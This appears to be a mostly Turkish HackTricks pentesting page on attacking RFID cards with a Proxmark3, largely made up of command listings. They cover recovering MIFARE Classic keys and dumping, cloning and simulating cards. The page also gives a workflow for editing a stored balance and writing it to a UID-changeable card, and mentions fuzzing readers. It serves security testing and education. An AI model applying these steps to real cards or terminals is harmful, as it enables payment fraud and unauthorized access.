# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 ile RFID Sistemlerine Saldırmak

The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB'ye Saldırmak

Bunun **16 sektörü** vardır, her biri **4 bloka** sahip ve her blok **16B** içerir. UID, sektör 0 blok 0'da bulunur (ve değiştirilemez).\
Her sektöre erişmek için **2 anahtara** (**A** ve **B**) ihtiyacınız vardır; bunlar **her sektörün blok 3'ünde** saklanır (sector trailer). Sector trailer ayrıca iki anahtarı kullanarak **her blok** için **okuma ve yazma** izinlerini veren **erişim bitlerini** de saklar.\
İki anahtar, örneğin ilkini biliyorsanız okuma, ikincisini biliyorsanız yazma izni vermek için faydalıdır.

Çeşitli saldırılar gerçekleştirilebilir
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **kullanılan kriptografik işlemler zayıftır** and knowing the plain and cipher text you can calculate it (`mfkey64` aracı).

#### MiFare Classic için saklanan bakiye kötüye kullanımı hızlı iş akışı

Terminaller Classic kartlarda bakiyeleri sakladığında, tipik uçtan uca akış şudur:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notlar

- `hf mf autopwn` nested/darkside/HardNested-style saldırıları organize eder, anahtarları kurtarır ve client dumps folder içinde dumplar oluşturur.
- block 0/UID yazma işlemi yalnızca magic gen1a/gen2 kartlarda çalışır. Normal Classic kartların UID'si salt okunurdur.
- Birçok dağıtım Classic "value blocks" veya basit checksums kullanır. Düzenleme yaptıktan sonra tüm tekrarlanan/tamamlanan alanların ve checksums'ın tutarlı olduğundan emin olun.

See a higher-level methodology and mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Ham Komutlar

IoT sistemleri bazen **markasız veya ticari olmayan etiketler** kullanır. Bu durumda, Proxmark3'ü kullanarak etiketlere özel **ham komutlar gönderebilirsiniz**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Bu bilgilerle kart ve onunla iletişim kurma yöntemi hakkında bilgi aramayı deneyebilirsiniz. Proxmark3 aşağıdaki gibi raw komutlar göndermenizi sağlar: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 yazılımı, basit görevleri gerçekleştirmek için kullanabileceğiniz önceden yüklenmiş bir **automation scripts** listesi ile gelir. Tam listeyi almak için `script list` komutunu kullanın. Ardından `script run` komutunu, script'in adını takip edecek şekilde kullanın:
```
proxmark3> script run mfkeys
```
**fuzz tag readers** yapmak için bir script oluşturabilirsiniz; bir **valid card**'ın verilerini kopyalayarak, bir veya daha fazla rastgele **bytes**'ı **randomize** eden bir **Lua script** yazın ve herhangi bir iterasyonda **reader crashes** olup olmadığını kontrol edin.

## Referanslar

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
